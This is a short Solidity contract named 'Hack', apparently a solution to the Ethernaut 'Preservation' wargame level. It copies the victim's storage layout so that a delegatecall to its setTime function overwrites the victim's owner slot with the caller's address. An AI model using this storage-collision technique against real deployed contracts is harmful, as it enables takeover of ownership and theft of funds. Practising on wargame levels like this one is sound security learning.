// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Preservation{}

contract Hack{
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    Preservation public target;

    constructor(address _victim){
        target = Preservation(_victim);
    }

    function setTime(uint) external{
        owner = msg.sender;
    }
}